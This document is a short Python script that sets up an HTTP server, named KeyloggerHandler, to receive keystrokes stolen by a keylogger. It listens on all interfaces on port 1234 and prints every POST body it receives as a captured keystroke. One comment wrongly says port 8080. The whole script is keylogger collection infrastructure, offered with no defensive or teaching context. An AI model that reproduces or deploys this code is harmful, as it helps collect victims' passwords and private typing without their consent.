from http.server import BaseHTTPRequestHandler, HTTPServer

class KeyloggerHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Read the length of the incoming data
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')  # Decode the POST data
        print(f"Keystroke captured: {post_data}")  # Print the captured data

        # Respond to the POST request
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Data received")

# Set up the server
server_address = ('', 1234)  # Listen on all interfaces, port 8080
httpd = HTTPServer(server_address, KeyloggerHandler)
print("Listening for keystrokes on port 1234...")
httpd.serve_forever()
